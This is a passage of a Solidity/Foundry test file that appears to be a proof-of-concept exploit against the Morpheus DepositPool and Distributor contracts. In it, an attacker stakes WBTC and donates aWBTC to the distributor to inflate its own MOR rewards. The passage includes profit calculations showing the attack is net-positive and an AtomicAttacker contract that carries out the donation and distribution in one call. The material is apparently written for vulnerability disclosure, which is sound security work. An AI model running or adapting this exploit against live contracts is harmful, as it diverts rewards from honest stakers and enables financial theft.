            uint256 donateNow = donationPerDay;
            uint256 bal = IERC20(aWBTC).balanceOf(attacker);
            if (donateNow > bal) donateNow = bal;
            if (donateNow > 0) {
                vm.prank(attacker);
                _checkedTransfer(aWBTC, DISTRIBUTOR, donateNow);
                totalDonated += donateNow;
            }
            _warpPastPeriod();
            _refreshFeeds();
            dist.distributeRewards(POOL_ID);
        }

        uint256 attackReward = IDepositPool(DP_WBTC).getLatestUserReward(POOL_ID, attacker);

        console.log("=== ECONOMIC CALIBRATION ATTACK ===");
        console.log("Control MOR (wei):", controlReward);
        console.log("Attack MOR (wei):", attackReward);
        console.log("Total aWBTC donated (8dec):", totalDonated);

        assertGt(attackReward, controlReward, "donation must increase attacker rewards");
        assertGt(attackReward - controlReward, 0, "donation must capture additional MOR");
    }

    /// @notice PROFIT PROOF: the attack is net-positive for the attacker, not mere griefing.
    ///         Because DepositPool.stake() calls distributeRewards() BEFORE crediting the new
    ///         deposit (DepositPool.sol:256-259), a fresh staker cannot capture the currently
    ///         open period. The minimal profitable attack is therefore: stake, warp exactly ONE
    ///         period, then in that single period donate once and distribute. Only feed freshness
    ///         is re-stamped (price answers unchanged) - the minimal manipulation the multi-period
    ///         nature forces. Isolating ONE attack period means the profit cannot be inflated by
    ///         compounding across many warped periods.
    ///
    ///         Optimum measured at this block: 10 WBTC stake + 0.01 WBTC donation. The attacker's
    ///         extra claimable MOR is worth materially more than the sunk donation. Stake is
    ///         recoverable after the 604800 s lock and is NOT counted as a cost; only the
    ///         unrecoverable donation is. MOR 2.057 USD, WBTC 78832.582339 USD (pool tokenPrice).
    function test_attackerNetPositive_singlePeriod() public {
        (,,,,,, address aWBTC,) = dist.depositPools(POOL_ID, DP_WBTC);

        uint256 stakeSat = 1e9;   // 10 WBTC dominant stake
        uint256 donateSat = 1e6;  // 0.01 WBTC donation, ~788 USD sunk

        uint256 snap = vm.snapshotState();

        // ---- CONTROL: stake, warp one period, distribute, NO donation ----
        vm.prank(WBTC_WHALE);
        _checkedTransfer(WBTC, attacker, stakeSat);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(DP_WBTC, stakeSat);
        IERC20(WBTC).approve(DISTRIBUTOR, stakeSat);
        IDepositPool(DP_WBTC).stake(POOL_ID, stakeSat, 0, address(0));
        vm.stopPrank();
        _warpPastPeriod();
        _refreshFeeds();
        dist.distributeRewards(POOL_ID);
        uint256 ctrlMor = IDepositPool(DP_WBTC).getLatestUserReward(POOL_ID, attacker);

        // ---- ATTACK: identical stake and period, plus one donation ----
        vm.revertToState(snap);
        vm.clearMockedCalls();
        vm.prank(WBTC_WHALE);
        _checkedTransfer(WBTC, attacker, stakeSat);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(DP_WBTC, stakeSat);
        IERC20(WBTC).approve(DISTRIBUTOR, stakeSat);
        IDepositPool(DP_WBTC).stake(POOL_ID, stakeSat, 0, address(0));
        vm.stopPrank();
        _acquireAWbtc(attacker, donateSat);
        _warpPastPeriod();
        _refreshFeeds();
        uint256 sent = IERC20(aWBTC).balanceOf(attacker);
        vm.prank(attacker);
        _checkedTransfer(aWBTC, DISTRIBUTOR, sent);
        dist.distributeRewards(POOL_ID);
        uint256 atkMor = IDepositPool(DP_WBTC).getLatestUserReward(POOL_ID, attacker);

        uint256 extraMor = atkMor - ctrlMor;
        // USD in micro-dollars: MOR 2.057 (18 dec), WBTC 78832.582339 per 1e8 sat.
        uint256 grossUsd = (extraMor * 2_057_000) / 1e18;
        uint256 donCostUsd = (donateSat * 78_832_582_339) / 1e8;

        console.log("=== ATTACKER NET-POSITIVE (single period, 10 WBTC stake, 0.01 WBTC donation) ===");
        console.log("control claimable MOR (wei):", ctrlMor);
        console.log("attack claimable MOR (wei):", atkMor);
        console.log("extra MOR captured (wei):", extraMor);
        console.log("gross extra value (micro-USD):", grossUsd);
        console.log("donation sunk cost (micro-USD):", donCostUsd);
        console.log("attacker net (micro-USD):", grossUsd - donCostUsd);

        // The attack extracts more MOR value than the donation costs: profitable, not griefing.
        assertGt(atkMor, ctrlMor, "donation must increase attacker's own claimable MOR");
        assertGt(grossUsd, donCostUsd, "attacker's extra MOR value must exceed the sunk donation cost");
    }
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

/// @notice Minimal attacker contract proving the diversion is atomic: a single external call
///         performs the unprivileged donation transfer AND the public distribution, with no
///         window between them. Holds only aWBTC the attacker acquired with its own capital;
///         has no owner, admin, or privileged relationship to any Morpheus contract.
contract AtomicAttacker {
    function attack(address yieldToken, address distributor, uint256 poolId) external {
        uint256 bal = IERC20(yieldToken).balanceOf(address(this));
        require(IERC20(yieldToken).transfer(distributor, bal), "donate failed");
        IDistributor(distributor).distributeRewards(poolId);
    }
}
